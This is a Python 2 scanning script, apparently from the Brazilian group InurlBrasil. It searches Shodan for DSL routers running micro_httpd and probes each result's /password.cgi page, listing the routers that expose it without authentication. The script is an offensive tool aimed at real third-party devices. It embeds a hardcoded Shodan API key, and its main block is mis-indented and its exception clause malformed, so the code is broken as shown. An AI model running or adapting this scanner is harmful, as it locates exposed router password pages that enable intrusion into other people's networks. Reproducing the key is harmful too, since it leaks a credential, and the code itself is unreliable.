# -*- coding: utf-8 -*-
#                  _       _   
#      ___ ___ _ _| |_ ___| |_ 
#     |  _| . | | |  _| -_|   |
#     |_| |___|___|_| |___|_|_|
#         
# Page: www.facebook.com/InurlBrasil
# Blog: blog.inurl.com.br

#Dependencias
# apt-get install python-shodan 
# easy_install shodan

from shodan import WebAPI
import re,socket
import os
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#Api Key Shodan
key = "50Zu8k1xXoSeTkRRl7SaRx7OJWHDQrP3"
 
os.system('clear')
print '               _       _    '
print '   ___ ___ _ _| |_ ___| |_  '
print '  |  _| . | | |  _| -_|   |  '
print '  |_| |___|___|_| |___|_|_|  '
print '                              '
print '  * Procura por modelo de roteadores vulneraveis na porta 80 com pagina password.cgi sem autentificação'
print ' /----------------------------'

 
def checar(ip):
         try:
                 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
                 sock.settimeout(1.5)
 
                 sock.connect((ip,80))
 
                 sock.send('GET /password.cgi HTTP/1.0\r\n\r\n')
 
                 res = sock.recv(100)
 

                 if(res.find('200 Ok') > 0):
 
                         return True
 
                 return False
 
         except:
 
                 return False

if __name__ == "__main__":
	
api = WebAPI(key)
res = api.search('DSL Router micro_httpd')#Dork shodan dos modelos vulneraveis
i = 1
try:
         while i <= 100: #Vai printar apenas 100 resultados pela API ser free
 
                 for ips in res['matches']:
 
                         print '[!] Testando http://%s' % ips['ip'] + bcolors.WARNING +' | Localizado em: ' + bcolors.ENDC + ips['country_name'] + bcolors.WARNING + ' | na porta:'+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.ENDC
 
                         if(checar(ips['ip'])):
							 
                                 print '[+] Is vull: http://%s/password.cgi' % ips['ip']
                                               
                 i +=1												
except():
         print 'Failed'
 
 
